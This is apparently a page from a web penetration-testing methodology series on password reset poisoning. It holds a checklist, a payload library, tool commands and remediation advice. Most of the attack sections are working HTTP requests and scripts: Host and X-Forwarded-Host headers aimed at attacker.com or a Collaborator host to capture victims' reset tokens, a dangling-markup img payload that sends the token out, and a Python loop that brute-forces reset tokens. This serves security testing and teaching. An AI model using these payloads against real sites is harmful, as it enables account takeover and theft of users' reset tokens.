---
title: "Password Reset Poisoning"
date: 2026-02-24
draft: false
---

# Password Reset Poisoning

> **Severity**: High–Critical | **CWE**: CWE-640, CWE-601
> **OWASP**: A07:2021 – Identification and Authentication Failures

---

## What Is Password Reset Poisoning?

Password reset poisoning exploits the generation of password reset links using attacker-influenced inputs — most commonly the `Host` header, `X-Forwarded-Host`, or other headers that control the domain embedded in the reset link.

```
Normal flow:
  POST /reset → App generates https://target.com/reset?token=abc → Email sent

Poisoned flow:
  POST /reset
  Host: attacker.com    ← modified
  → App generates https://attacker.com/reset?token=abc → Email sent
  → Victim clicks → token delivered to attacker.com
  → Attacker resets victim's password
```

---

## Discovery Checklist

- [ ] Find the password reset request (POST /forgot-password, /reset-password, etc.)
- [ ] Modify `Host` header → check if reflected in reset link (monitor email or OOB)
- [ ] Test `X-Forwarded-Host`, `X-Host`, `X-Forwarded-Server`, `X-HTTP-Host-Override`
- [ ] Test `Referer` header — some apps use it to build base URL
- [ ] Test `Host` with port: `target.com:attacker.com` — host confusion
- [ ] Test with Burp Collaborator as header value
- [ ] Test token predictability — sequential, time-based, short length
- [ ] Test token expiry — does it expire? After how long?
- [ ] Test token reuse — can same token be used twice?
- [ ] Test for token in URL (GET-based reset) — Referer leakage
- [ ] Check if token is leaked in response body, JSON, or other headers
- [ ] Test same token for all accounts (global/static token)
- [ ] Test race condition: request reset → use token → request again

---

## Payload Library

### Attack 1 — Host Header Poisoning

```bash
# Step 1: Identify the password reset endpoint
POST /forgot-password HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=victim@corp.com

# Step 2: Modify Host to attacker-controlled (use Burp Collaborator):
POST /forgot-password HTTP/1.1
Host: COLLABORATOR_ID.oast.pro
Content-Type: application/x-www-form-urlencoded

email=victim@corp.com

# Step 3: Check Collaborator for incoming request with token
# e.g.: GET /reset?token=VICTIM_TOKEN HTTP/1.1 Host: COLLABORATOR_ID.oast.pro

# Step 4: Use token to reset victim's password
POST /reset-password HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

token=VICTIM_TOKEN&password=NewPassword123&confirm=NewPassword123
```

### Attack 2 — X-Forwarded-Host Override

```bash
# Many frameworks prefer X-Forwarded-Host over Host for URL generation:
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com

email=victim@corp.com

# Variants to test:
X-Host: attacker.com
X-Forwarded-Server: attacker.com
X-Original-Host: attacker.com
X-Rewrite-URL: https://attacker.com/reset

# Password reset via API (JSON body):
POST /api/auth/forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: attacker.com
Content-Type: application/json

{"email": "victim@corp.com"}
```

### Attack 3 — Dangling Markup via Host Injection

```bash
# If only part of the URL is controlled:
# Host injection → partial reset link poisoning

# Inject newline to add hidden header / exfil via img tag:
Host: target.com
X-Forwarded-Host: attacker.com"><img src="https://attacker.com/?x=

# The email HTML becomes:
# Reset your password: https://attacker.com"><img src="https://attacker.com/?x=.../reset?token=abc
# → If email client renders HTML: token in img src request to attacker
```

### Attack 4 — Token Analysis and Brute Force

```bash
# Analyze token structure:
# Request multiple resets for your own account → compare tokens

# Token A: 5f4dcc3b5aa765d61d8327de  (hex-encoded MD5?)
# Token B: 6cb75f652a9b52798eb6cf2201057c73
# Token C: 098f6bcd4621d373cade4e832627b4f6

# MD5/SHA1 check:
echo -n "password" | md5sum    # 5f4dcc3b5aa765d61d8327de
echo -n "test" | md5sum        # 098f6bcd4621d373cade4e832627b4f6

# If token = md5(email):
echo -n "victim@corp.com" | md5sum

# If token = md5(username + timestamp):
python3 -c "import hashlib,time; print(hashlib.md5(f'admin{int(time.time())}'.encode()).hexdigest())"

# Sequential token detection:
# Token 1: 1001, Token 2: 1002 → Token for admin may be 1003

# Short token brute force (6-char alphanumeric = 56 billion but 6-digit numeric = 1M):
python3 -c "
import requests, string, itertools

chars = string.digits
for token in itertools.product(chars, repeat=6):
    t = ''.join(token)
    r = requests.get(f'https://target.com/reset?token={t}')
    if r.status_code == 200 and 'Invalid' not in r.text:
        print(f'Valid token: {t}')
        break
"
```

### Attack 5 — Token in Referer Leakage

```bash
# If reset link is: https://target.com/reset?token=abc123
# Page at /reset loads external resources (Google Analytics, CDN scripts)
# Referer header leaks the token to third parties

# Test: visit the reset link → check outgoing Referer headers in Burp
# Network tab → look for requests to external domains after clicking reset link

# If token is in query string → it leaks to:
# - Google Analytics
# - Any third-party script on the reset page
# - Browser history
# - Web server access logs

# Also test: is token in response JSON after POST?
POST /api/reset-password
{
  "email": "attacker@myown.com"
}
# Response: {"success": true, "token": "abc123", "message": "Email sent"}
# → Token exposed in API response directly
```

### Attack 6 — Reset Token as Login Bypass

```bash
# Some apps accept reset token as authentication:
GET /reset?token=TOKEN → shows reset form
POST /reset?token=TOKEN → changes password

# Test: can you skip the password change and use the token to log in?
# (Depends on implementation — some single-step flows)

# Also: does reset token work as a temp session?
GET /dashboard HTTP/1.1
Cookie: session=RESET_TOKEN
# → If app accepts reset token as session cookie
```

---

## Tools

```bash
# Burp Collaborator:
# Use BURP_COLLABORATOR.oast.pro as Host value
# Check Collaborator for incoming DNS + HTTP with reset token

# interactsh (open-source Collaborator alternative):
interactsh-client -v
# Get your interactsh URL, use as Host value

# Token analysis:
python3 -c "
import base64, hashlib
token = 'YOUR_RESET_TOKEN'
# Check base64:
try: print('b64:', base64.b64decode(token + '=='))
except: pass
# Check hex/hash length:
print(f'Len: {len(token)}, Hex: {all(c in \"0123456789abcdef\" for c in token.lower())}')
"

# Multiple reset requests for analysis:
for i in $(seq 1 5); do
  curl -s -X POST https://target.com/forgot-password \
    -d "email=attacker+$i@yourdomain.com" &
done
wait
# Check all received emails → compare tokens for patterns

# Burp Intruder for token brute-force:
# GET /reset?token=§0000000000§
# Payload: Numbers 0000000000 to 9999999999
# Match: "New Password" in response
```

---

## Remediation Reference

- **Generate reset URL from server configuration**, not from the `Host` request header
- **Enforce strict host validation**: use `ALLOWED_HOSTS` / `server_name` configuration
- **Cryptographically random tokens**: 256-bit entropy minimum (`secrets.token_urlsafe(32)` in Python)
- **Short TTL**: reset tokens expire in 10–60 minutes
- **Single-use**: invalidate token immediately after use (even failed attempts after 3 tries)
- **Never send token in response body**: send only via email to registered address
- **Bind token to specific email/account**: verify that token matches the requesting account
- **Avoid query-string tokens** for long-lived operations — use POST body or signed JWT with short TTL

*Part of the Web Application Penetration Testing Methodology series.*
